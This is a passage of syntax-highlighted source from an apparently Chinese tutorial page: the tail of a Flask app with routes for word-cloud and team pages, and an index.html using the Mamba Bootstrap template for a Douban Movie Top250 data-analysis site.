punctuation">,</span> num<span class="token operator">=</span>num<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/word'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">word</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"word.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/team'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">team</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"team.html"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Mamba Bootstrap Template - Index<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>descriptison<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Favicons --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/favicon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/apple-touch-icon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>apple-touch-icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Google Fonts --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,600,600i,700,700i,900<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor CSS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/icofont/icofont.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/boxicons/css/boxicons.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/animate.css/animate.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main CSS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/css/style.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- =======================================================  * Template Name: Mamba - v2.0.1  * Template URL: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/  * Author: BootstrapMade.com  * License: https://bootstrapmade.com/license/  ======================================================== --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- ======= Header ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo float-left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-light<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- Uncomment below if you prefer to use an image logo --></span>        <span class="token comment">&lt;!-- &lt;a href="index.html">&lt;img src="static/assets/img/logo.png" alt="" class="img-fluid">&lt;/a>--></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-menu float-right d-none d-lg-block<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Home<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/movie<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>movie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/score<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>rating<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>wordcloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Team<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- .nav-menu --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Header --></span><span class="token comment">&lt;!-- ======= Our Team Section ======= --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>team<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>section-title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>豆瓣电影Top250数据分析<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>应用Python爬虫、Flask框架、Echarts等技术实现<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>         <span class="token comment">&lt;!-- ======= Counts Section ======= --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>counts section-bg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-lg-3 col-md-6 text-center<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fade-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/movie<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>count-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-simple-smile<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span> #20b38e<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">data-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>counter-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>250<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>经典电影<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-lg-3 col-md-6 text-center<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fade-up<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos-delay</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/score<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>count-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-document-folder<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span> #c042ff<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">data-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>counter-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>评分统计<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-lg-3 col-md-6 text-center<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fade-up<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos-delay</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>400<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>count-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-live-support<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span> #46d1ff<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">data-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>counter-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>5693<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>词汇统计<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-lg-3 col-md-6 text-center<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fade-up<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos-delay</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>600<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>count-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-users-alt-5<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span> #ffb459<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">data-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>counter-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>团队成员<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Counts Section --></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Our Team Section --></span>  <span class="token comment">&lt;!-- ======= Footer ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>copyright<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token entity named-entity" title="&copy;">&amp;copy;</span> Copyright <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>. All Rights Reserved      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>credits<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span 